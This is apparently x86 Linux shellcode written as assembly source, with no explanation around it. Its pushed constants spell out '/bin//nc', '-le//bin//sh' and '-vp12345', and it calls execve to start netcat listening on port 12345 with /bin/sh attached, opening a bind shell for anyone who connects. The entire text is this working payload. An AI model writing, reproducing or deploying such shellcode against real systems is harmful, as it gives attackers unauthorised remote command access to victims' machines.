section .text
	global _start
_start:

	xor edx, edx
	push edx
	push 0x35343332 ; -vp12345
	push 0x3170762d
	mov esi, esp

	push edx
	push 0x68732f2f
	push 0x6e69622f
	push 0x2f656c2d
	mov edi, esp

	push edx
	push 0x636e2f2f
	push 0x6e69622f
	mov ebx, esp

	push edx
	push esi
	push edi
	push ebx
	mov ecx, esp
	xor eax, eax
	mov al,11
	int 0x80
